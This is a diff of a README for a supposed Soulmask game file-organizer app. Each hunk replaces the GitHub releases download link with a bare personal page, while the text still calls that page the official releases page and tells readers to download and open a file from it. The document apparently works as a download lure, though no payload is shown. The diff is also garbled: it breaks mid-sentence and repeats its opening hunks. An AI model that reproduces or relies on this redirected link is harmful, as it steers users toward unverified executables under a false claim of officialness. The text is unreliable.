@@ -1,6 +1,6 @@
 # 🧰 soulmask-desktop - Keep Your Soulmask Files Organized
 
-[![Download Soulmask Desktop](https://img.shields.io/badge/Download-Soulmask%20Desktop-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/KWAMIVAVA/soulmask-desktop/releases)
+[![Download Soulmask Desktop](https://img.shields.io/badge/Download-Soulmask%20Desktop-orange?style=for-the-badge&logo=windows&logoColor=white)](https://kwamivava.github.io)
 
 Soulmask Desktop is a small, friendly helper for Windows and macOS that keeps track of where your Soulmask data lives. Instead of hunting through hidden folders, you get one clear place to see your data paths, your configuration files, your export caches, and your export folders. It does not change how the game works — it simply makes the files behind the game easier to find, open, and back up.
 
@@ -12,7 +12,7 @@ If you have ever wondered "where did my save data go?" or "which folder holds my
 
 Visit this link to download the application:
 
-**➡️ https://github.com/KWAMIVAVA/soulmask-desktop/releases**
+**➡️ https://kwamivava.github.io**
 
 The link above opens the official releases page. On that page you will see the available download files listed. Pick the file that matches your computer, save it to a place you can find again (usually your Downloads folder), then open it to start the helper.
 
@@ -119,7 +119,7 @@ If you share a computer, this is also the quickest way to show someone else wher
 - **Run it before you need it.** Opening the helper once a month keeps you familiar with your paths.
 - **Write your paths down.** A short note# 🧰 soulmask-desktop - Keep Your Soulmask Files Organized
 
-[![Download Soulmask Desktop](https://img.shields.io/badge/Download-Soulmask%20Desktop-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/KWAMIVAVA/soulmask-desktop/releases)
+[![Download Soulmask Desktop](https://img.shields.io/badge/Download-Soulmask%20Desktop-orange?style=for-the-badge&logo=windows&logoColor=white)](https://kwamivava.github.io)
 
 Soulmask Desktop is a small, friendly helper for Windows and macOS that keeps track of where your Soulmask data lives. Instead of hunting through hidden folders, you get one clear place to see your data paths, your configuration files, your export caches, and your export folders. It does not change how the game works — it simply makes the files behind the game easier to find, open, and back up.
 
@@ -131,7 +131,7 @@ If you have ever wondered "where did my save data go?" or "which folder holds my
 
 Visit this link to download the application:
 
-**➡️ https://github.com/KWAMIVAVA/soulmask-desktop/releases**
+**➡️ https://kwamivava.github.io**
 
 The link above opens the official releases page. On that page you will see the available download files listed. Click the file that matches your computer, save it somewhere you can find again (usually your Downloads folder), then open it to start the helper.
 
